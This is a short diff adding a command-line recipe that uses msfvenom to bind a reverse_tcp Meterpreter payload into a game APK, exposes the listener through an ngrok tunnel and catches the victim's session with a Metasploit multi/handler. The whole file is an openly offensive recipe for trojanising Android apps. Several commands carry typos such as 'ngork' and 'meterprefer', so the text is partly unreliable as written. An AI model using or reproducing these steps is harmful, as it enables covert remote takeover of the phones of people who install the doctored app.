@@ -1,0 +1,15 @@
+
+#Note Install frm this first https://github.com/graylagx2/apktoolfix/tree/master
+sudo msfvenom --list payload | grep android
+
+./ngork tcp
+sudo msfvenom --platform android -x ~/Desktop/#Game of APp too attch payload -p android/meterprefer/reverse_tcp LHOST=kalimachine
+Ip LPORT=any port number -f raw -o filename.apk
+
+msfconsole -q
+use exploit/multi/handler
+show options
+set payload android/meterprefer/reverse_tcp
+set LHOST=0.0.0.0
+set LPORT=#use your port of ngrok
+run
